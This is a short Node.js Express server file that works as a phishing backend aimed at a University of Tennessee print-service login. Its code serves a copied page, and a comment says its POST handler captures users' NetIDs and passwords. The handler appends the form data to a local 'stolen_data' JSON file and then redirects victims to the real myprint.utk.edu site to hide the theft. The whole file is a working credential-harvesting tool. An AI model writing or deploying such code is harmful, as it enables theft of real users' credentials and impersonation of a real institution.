const express = require("express");
const fs = require("fs");
const https = require('https');
const bodyParser = require("body-parser");

const key = fs.readFileSync('./security/cert.key');
const cert = fs.readFileSync('./security/cert.crt');
const app = express();

app.use(express.static(__dirname));
app.use(bodyParser.urlencoded({ extended: true }));

app.get("/", (req, res) => {
  res.sendFile(__dirname + "./index.html");
});

/* During a post (trying to log in), save the user's NetID and Password into a JSON file and redirect to the legit site */
app.post("/", function (req, res) {
  let body = {
    user_info: req.body,
  };
  let filePath = __dirname + "/stolen_data/data.json";

  fs.appendFile(filePath, JSON.stringify(body), function (err) {
    if (err) {
      throw err;
    }
    res.status(200);
    res.redirect(302, "https://myprint.utk.edu/myprintcenter/");
  });
});

const server = https.createServer({ key: key, cert: cert }, app);
server.listen(3000, () => {
  console.log("Application started and Listening on port 3000");
});